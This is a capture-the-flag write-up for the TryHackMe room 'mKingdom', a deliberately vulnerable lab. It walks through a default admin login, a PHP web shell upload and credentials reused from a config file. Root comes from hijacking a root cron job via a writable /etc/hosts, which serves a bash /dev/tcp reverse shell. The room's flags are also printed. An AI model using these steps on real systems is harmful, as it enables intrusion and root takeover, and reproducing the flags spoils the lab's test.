## mKingdom - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/mkingdom)

Try to root the machine!

Please allow up to 3 minutes for the machine to boot.

For free tier users, using your own VM is strongly recommended.

**IP: 10.10.189.243**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap and Gobuster.

  ```
  nmap -sC -sV -p- 10.10.189.243

  Not shown: 65534 closed tcp ports (reset)
  PORT   STATE SERVICE VERSION
  85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
  |_http-title: 0H N0! PWN3D 4G4IN
  |_http-server-header: Apache/2.4.7 (Ubuntu)
  ```

  ```
  gobuster dir -u http://10.10.189.243:85/ -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 284]
  /.htpasswd            (Status: 403) [Size: 289]
  /.htaccess            (Status: 403) [Size: 289]
  /app                  (Status: 301) [Size: 314] [--> http://10.10.189.243:85/app/]
  /index.html           (Status: 200) [Size: 647]
  /server-status        (Status: 403) [Size: 293]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================

  gobuster dir -u http://10.10.189.243:85/app/castle/ -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.htaccess            (Status: 403) [Size: 300]
  /.hta                 (Status: 403) [Size: 295]
  /.htpasswd            (Status: 403) [Size: 300]
  /application          (Status: 301) [Size: 333] [--> http://10.10.189.243:85/app/castle/application/]
  /concrete             (Status: 301) [Size: 330] [--> http://10.10.189.243:85/app/castle/concrete/]
  /index.php            (Status: 200) [Size: 12059]
  /packages             (Status: 301) [Size: 330] [--> http://10.10.189.243:85/app/castle/packages/]
  /robots.txt           (Status: 200) [Size: 532]
  /updates              (Status: 301) [Size: 329] [--> http://10.10.189.243:85/app/castle/updates/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When you visit `http://10.10.189.243:85/app/castle/`, there will be a login prompt at the bottom of the app. I logged in with `admin:password` LOL.

---

## ⚙️ Shell Access

- Now go to System Settings -> Allowed File Types and add `php` and save it. After that upload a classic PHP shell and you will be given an URL of the shell. When you visit that URL, you will get a connection.

  ```
  URL to File

  http://10.10.189.243:85/app/castle/application/files/4217/4872/6364/shell.php
  
  Tracked URL
  
  http://10.10.189.243:85/app/castle/index.php/download_file/28/0
  
  Title
  
  shell.php
  ```

  ```
  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.189.243] 53696
  Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
   17:20:05 up 15 min,  0 users,  load average: 0.04, 0.04, 0.05
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
  ```
  
- Change it to Putty shell and move to flag capturing.

---

## 🧍 User Privilege Escalation

- We can't access any directory in `/home`.

  ```
  www-data@mkingdom:/$ cd home
  www-data@mkingdom:/home$ ls -al
  total 16
  drwxr-xr-x  4 root  root  4096 Jun  9  2023 .
  drwxr-xr-x 23 root  root  4096 Jun  7  2023 ..
  drwx------ 15 mario mario 4096 Jan 29  2024 mario
  drwxrwx--- 16 toad  toad  4096 Jan 29  2024 toad
  
  www-data@mkingdom:/home$ cd toad
  bash: cd: toad: Permission denied
  
  www-data@mkingdom:/home$ cd mario/
  bash: cd: mario/: Permission denied
  ```
  
- You can find `toad` credentials in PHP database.

  ```
  <?phpata@mkingdom:/var/www/html/app/castle/application/config$ cat database.php  

  return [
      'default-connection' => 'concrete',
      'connections' => [
          'concrete' => [
              'driver' => 'c5_pdo_mysql',
              'server' => 'localhost',
              'database' => 'mKingdom',
              'username' => 'toad',
              'password' => 'toadisthebest',
              'character_set' => 'utf8',
              'collation' => 'utf8_unicode_ci',
          ],
      ],
  ];
  ```
  
- Since I'm a madman, I tried this password for his SSH login and well...

  ```
  www-data@mkingdom:/var/www/html/app/castle/application/config$ su toad
  Password: 
  toad@mkingdom:/var/www/html/app/castle/application/config$ 
  toad@mkingdom:/var/www/html/app/castle/application/config$ id
  uid=1002(toad) gid=1002(toad) groups=1002(toad)
  ```

- ALWAYS TRY NEWLY FOUND PASSWORDS FOR ALL SERVICES YOU HAVE ACCESS TO!

- So now, we have to escalate to `mario` in order to read the flag. This was cool tho.

  ```
  toad@mkingdom:~$ cat smb.txt 

  Save them all Mario!
  
                                        \| /
                      ....'''.           |/
               .''''''        '.       \ |
               '.     ..     ..''''.    \| /
                '...''  '..''     .'     |/
       .sSSs.             '..   ..'    \ |
      .P'  `Y.               '''        \| /
      SS    SS                           |/
      SS    SS                           |
      SS  .sSSs.                       .===.
      SS .P'  `Y.                      | ? |
      SS SS    SS                      `==='
      SS ""    SS
      P.sSSs.  SS
      .P'  `Y. SS
      SS    SS SS                 .===..===..===..===.
      SS    SS SS                 |   || ? ||   ||   |
      ""    SS SS            .===.`==='`==='`==='`==='
    .sSSs.  SS SS            |   |
   .P'  `Y. SS SS       .===.`==='
   SS    SS SS SS       |   |
   SS    SS SS SS       `==='
  SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
  ```

- I spent a while enumerating here and found my way to `mario` with `env`.

  ```
  toad@mkingdom:/usr/bin$ env
  APACHE_PID_FILE=/var/run/apache2/apache2.pid
  XDG_SESSION_ID=c2
  SHELL=/bin/bash
  APACHE_RUN_USER=www-data
  TERM=xterm
  OLDPWD=/var/backups
  USER=toad
  LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;*1:*.tb=0135:*[SNIP!].ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
  PWD_token=aWthVGVOVEFOdEVTCg==
  MAIL=/var/mail/toad
  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
  APACHE_LOG_DIR=/var/log/apache2
  PWD=/usr/bin
  LANG=en_US.UTF-8
  APACHE_RUN_GROUP=www-data
  HOME=/home/toad
  SHLVL=2
  LOGNAME=toad
  LESSOPEN=| /usr/bin/lesspipe %s
  XDG_RUNTIME_DIR=/run/user/1002
  APACHE_RUN_DIR=/var/run/apache2
  APACHE_LOCK_DIR=/var/lock/apache2
  LESSCLOSE=/usr/bin/lesspipe %s %s
  _=/usr/bin/env
  ```

- After decoding the `PWD_token` I found Mario's password.

  ```
  echo 'aWthVGVOVEFOdEVTCg==' | base64 -d                                       
  ikaTeNTANtES
  
  toad@mkingdom:/usr/bin$ su mario
  Password: 
  mario@mkingdom:/usr/bin$ whoami
  mario
  mario@mkingdom:/usr/bin$ id
  uid=1001(mario) gid=1001(mario) groups=1001(mario)
  ```

- IT'S A MIA MARIO! You can read the first flag and move to root escalation.

  ```
  mario@mkingdom:~$ ls -al
  total 96
  drwx------ 15 mario mario 4096 Jan 29  2024 .
  drwxr-xr-x  4 root  root  4096 Jun  9  2023 ..
  lrwxrwxrwx  1 mario mario    9 Jun  9  2023 .bash_history -> /dev/null
  -rw-r--r--  1 mario mario  220 Jun  7  2023 .bash_logout
  -rw-r--r--  1 mario mario 3637 Jun  7  2023 .bashrc
  drwx------ 11 mario mario 4096 Jan 26  2024 .cache
  drwx------  3 mario mario 4096 Jan 29  2024 .compiz
  drwx------ 14 mario mario 4096 Jan 26  2024 .config
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Desktop
  -rw-r--r--  1 mario mario   25 Jan 26  2024 .dmrc
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Documents
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Downloads
  drwx------  3 mario mario 4096 Jan 29  2024 .gconf
  -rw-------  1 mario mario 1026 Jan 29  2024 .ICEauthority
  drwx------  3 mario mario 4096 Jan 26  2024 .local
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Music
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Pictures
  -rw-r--r--  1 mario mario  675 Jun  7  2023 .profile
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Public
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Templates
  -rw-r--r--  1 root  root    38 Nov 27  2023 user.txt
  drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Videos
  -rw-------  1 mario mario   57 Jan 29  2024 .Xauthority
  -rw-------  1 mario mario 1581 Jan 29  2024 .xsession-errors
  -rw-------  1 mario mario  805 Jan 26  2024 .xsession-errors.old
  mario@mkingdom:~$ cat user.txt 
  cat: user.txt: Permission denied
  ```

- You thought it was that easy huh? I have a pretty cool technique for this, search for all the `cat` files on the system.

  ```
  mario@mkingdom:~$ find / -type f -name cat 2>/dev/null
  /bin/cat
  /usr/lib/klibc/bin/cat
  ```

- Since noone on the system has permissions to use `/bin/cat`, we will use `/usr/lib/klibc/bin/cat`.

  ```
  mario@mkingdom:~$ /usr/lib/klibc/bin/cat user.txt 
  thm{030a769febb1b3291da1375234b84283}
  ```

---

## 👑 Root Privilege Escalation

- For root I used `pspy` and found a cronjob that's downloading a bash script.

  ```
  2025/05/31 17:41:50 CMD: UID=0    PID=1      | /sbin/init
  2025/05/31 17:42:01 CMD: UID=0    PID=2489   | bash 
  2025/05/31 17:42:01 CMD: UID=0    PID=2488   | curl mkingdom.thm:85/app/castle/application/counter.sh 
  2025/05/31 17:42:01 CMD: UID=0    PID=2487   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
  2025/05/31 17:42:01 CMD: UID=0    PID=2486   | CRON 
  2025/05/31 17:42:01 CMD: UID=0    PID=2493   | bash 
  ```
  
- The plan now is to check `/etc/hosts`, replace the IP with our IP, create a full path to this script with reverse shell inside. Since we have write permission to `/etc/hosts`, let's do it!

  ```
  mario@mkingdom:~$ ls -al /etc/hosts
  -rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
  
  mario@mkingdom:~$ cat /etc/hosts
  127.0.0.1       localhost
  [YOUR-THM-IP]   mkingdom.thm
  127.0.0.1       backgroundimages.concrete5.org
  127.0.0.1       www.concrete5.org
  127.0.0.1       newsflow.concrete5.org
  
  # The following lines are desirable for IPv6 capable hosts
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters
  ```
  
- Now, on your local machine create a directory `/app/castle/application/counter.sh` with bash script containing a classic bash reverse shell.

  ```
  cat counter.sh 
  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/5555 0>&1
  ```

- Now run a Python server on port 85 and start a listener. After a minute you will see that target machine downloaded a script from you and you will get a connection on your listener.

  ```
  python3 -m http.server 85
  Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
  10.10.189.243 - - [31/May/2025 22:49:02] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
  
  
  nc -lvnp 5555
  listening on [any] 5555 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.189.243] 49410
  whoami
  root
  id
  uid=0(root) gid=0(root) groups=0(root)
  ```

- Read the flag and it's done.

  ```
  pwd
  /root
  ls
  counter.sh
  root.txt
  /usr/lib/klibc/bin/cat root.txt
  thm{e8b2f52d88b9930503cc16ef48775df0}
  ```

- Loved this room! I grew up on Mario games and even have a tattoo related to them so nostalgia was hitting hard here.

---

## 🏁 Flags

- **User Flag**: `thm{030a769febb1b3291da1375234b84283}`
- **Root Flag**: `thm{e8b2f52d88b9930503cc16ef48775df0}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting to root.`

- What did I learn?
  `Few new exploit methods.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
